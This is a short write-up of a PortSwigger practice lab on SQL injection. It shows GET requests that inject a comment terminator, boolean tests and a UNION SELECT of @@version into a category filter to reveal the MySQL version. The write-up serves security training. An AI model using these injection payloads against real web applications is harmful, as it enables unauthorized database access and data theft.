# SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. (Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2')

---------------------------------------------
Reference: 
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


Filtering using GET parameter “category”: "/filter?category=Accesories"

<img width="1920" height="1022" alt="1" src="https://github.com/user-attachments/assets/d13e7a6b-456a-4a64-9920-7685411630c7" />


/filter?category=Accesories -> Return 4 items

/filter?category=Accessories';# -> Return 4 items, the query is finished

/filter?category=Accessories'+and+'1'='1  -> Return 4 items

/filter?category=Accessories'+and+'1'='0  -> Return 0 items

/filter?category=Accessories'+union+select+0,@@version#

```
GET /filter?category=Accessories'+union+select+0,@@version#
``` 

<img width="1920" height="1022" alt="2" src="https://github.com/user-attachments/assets/6401bd8c-21e1-4569-807b-ee154fee46e9" />
